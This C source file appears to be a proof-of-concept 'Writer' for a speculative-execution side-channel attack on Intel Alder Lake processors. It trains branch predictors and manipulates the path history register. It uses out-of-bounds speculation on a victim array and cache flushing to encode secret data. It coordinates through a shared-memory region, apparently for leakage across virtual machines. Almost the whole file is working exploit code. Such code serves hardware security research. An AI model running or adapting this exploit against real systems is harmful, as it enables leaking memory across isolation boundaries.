#include <fcntl.h>
#include <semaphore.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>
#include <x86intrin.h>

/* Clear the PHR (specifically designed for Intel Alder Lake processors) */
extern void clear_phr();
extern void shift_phr();
extern void set_phr(int input);

/* Cache Hit Threshold for Intel CPUs */
#define cache_hit_threshold 150

/* Number of iterations to train bpu. */
const size_t TRAINING = 128;

/* Number of samples (repeats of the entire attack). */
const size_t SAMPLE_COUNT = 100;

/* Victim Array */
uint8_t victim_array[64];

/* Victim Function's Boundary Check Value */
size_t VICTIM_COND = 32;

/* Probe Array */
#define PROBE_DIST 512

#define SHM_PATH "/dev/shm/ivshmem0"
#define SHM_SIZE (1 * 1024 * 1024)

struct SharedRegion {
  volatile uint32_t lock;
  volatile uint32_t turn;
};

volatile uint8_t probe[256 * PROBE_DIST];

/********************************************************************
Helper Functions
********************************************************************/

typedef struct {
  size_t value;
  size_t index;
} IndexedValue;

/* Helper function for finding two largest values in an array */
void findTwoLargest(const size_t hits[], size_t size, IndexedValue *largest1,
                    IndexedValue *largest2) {
  *largest1 = (IndexedValue){0, 0};
  *largest2 = (IndexedValue){0, 0};
  for (size_t i = 0; i < size; ++i) {
    if (hits[i] > largest1->value) {
      largest2->value = largest1->value;
      largest2->index = largest1->index;
      largest1->value = hits[i];
      largest1->index = i;
    } else if (hits[i] > largest2->value) {
      largest2->value = hits[i];
      largest2->index = i;
    }
  }
}

/* Helper function for measuring the access time of ptr[index] */
uint64_t time_access(volatile void *ptr, size_t index) {
  ptr += index;
  uint32_t junk;
  uint64_t start = __rdtscp(&junk);
  __asm__ __volatile__("" : : "r"(*(volatile char *)ptr));
  // ptr[index]++;
  uint64_t end = __rdtscp(&junk);
  return end - start;
}

uint64_t time_access_dcache(volatile uint8_t *ptr, size_t index) {
  uint32_t junk;
  uint64_t start = __rdtscp(&junk);
  ptr[index]++;
  uint64_t end = __rdtscp(&junk);
  return end - start;
}

static inline void lock_spin(volatile uint32_t *l) {
  while (__sync_lock_test_and_set(l, 1)) {
  }
}

static inline void unlock_spin(volatile uint32_t *l) { __sync_lock_release(l); }

/* Helper function for flushing the memory referenced by ptr */
void flush(volatile void *ptr, size_t length) {
  uint8_t *byte_ptr = (uint8_t *)ptr;

  // Align to cache line
  length += (uintptr_t)byte_ptr & 0x3F;
  byte_ptr = (uint8_t *)((uintptr_t)byte_ptr & ~0x3F);

  // Flush every cacheline
  for (size_t i = 0; i < length; i += 64) {
    // Optimized CLFLUSH instruction for Intel CPUs
    __asm__ __volatile__("clflushopt (%0)\n\t"
                         :
                         : "r"(byte_ptr + i)
                         : "memory");
  }

  _mm_lfence();
}

/********************************************************************
Victim Code
********************************************************************/
/* Spy Target 1 */
void __attribute__((aligned(64))) target_spy() {
  __asm__ __volatile__("pop %rbp\n\t"
                       ".rept 131072\n\t"
                       "ret\n\t"
                       ".endr\n\t");
}

/* Victim Function : Spy */
void __attribute__((aligned(64))) victim_spy(int input) {

  void (*spy_indirect_branch)();
  spy_indirect_branch = target_spy;

  __asm__ __volatile__(".align 1<<16\n\t");
  clear_phr();
  set_phr(0);
  if (input < VICTIM_COND) {
    int offset = PROBE_DIST * victim_array[input];
    spy_indirect_branch += offset;
    spy_indirect_branch();
  }

  return;
}

/* Benign Target 0 */
void benign_target0() { return; }

/* Benign Target 1 */
void benign_target1() { return; }

/* Victim Function : Main */
void victim_function(int input) {

  void (*victim_indirect_branch)();
  if (input == 0)
    victim_indirect_branch = benign_target0;
  else
    victim_indirect_branch = benign_target1;

  _mm_clflush(&victim_indirect_branch);
  _mm_mfence();

  __asm__ __volatile__(".align 1<<16\n\t");
  clear_phr();
  set_phr(input);

  __asm__ __volatile__(".rept 52\n\t"
                       "nop\n\t"
                       ".endr\n\t");
  victim_indirect_branch();

  return;
}

/********************************************************************
Main Function
********************************************************************/
int main(int argc, const char **argv) {

  printf("\nPoC: Writer\n");
  // printf("cache hit threshold is: %d\n", cache_hit_threshold);
  printf("----------------------------\n");

  int hits_target0_spy, hits_target1_spy;
  hits_target0_spy = 0;
  hits_target1_spy = 0;

  /* Initialize Victim Array */
  for (size_t i = 0; i < 64; i++) {
    victim_array[i] = i;
  }

  size_t hits[256] = {0};

  // victim function generic pointer
  void (*victim)();

  int fd = open(SHM_PATH, O_RDWR);
  if (fd < 0) {
    perror("open");
    return 1;
  }

  struct SharedRegion *sh =
      mmap(NULL, SHM_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

  if (sh == MAP_FAILED) {
    perror("mmap");
    return 1;
  }

  sh->turn = 0;
  sh->lock = 0;

  for (size_t i = 0; i < SAMPLE_COUNT; i++) {
    // Reset cache state (Flush)
    flush(target_spy, 256 * PROBE_DIST);
    _mm_mfence();
    while (sh->turn != 0) {
    }

    // Step 1: Train CBP
    for (size_t k = 0; k < 100; k++) {
      victim_spy(0);
    }

    _mm_mfence();

    // Step 2: Train IBP for the victim function
    for (size_t k = 0; k < 10; k++)
      victim_function(k % 2);

    _mm_mfence();

    // Step 3: Speculatively update the IBP
    _mm_clflush(&VICTIM_COND);
    _mm_mfence();
    victim_spy(54);
    _mm_clflush(&VICTIM_COND);
    _mm_mfence();
    victim_spy(54);
    _mm_clflush(&VICTIM_COND);
    _mm_mfence();
    victim_spy(54);
    _mm_clflush(&VICTIM_COND);
    _mm_mfence();
    victim_spy(54);

    sh->turn = 1;
  }

  return 0;
}
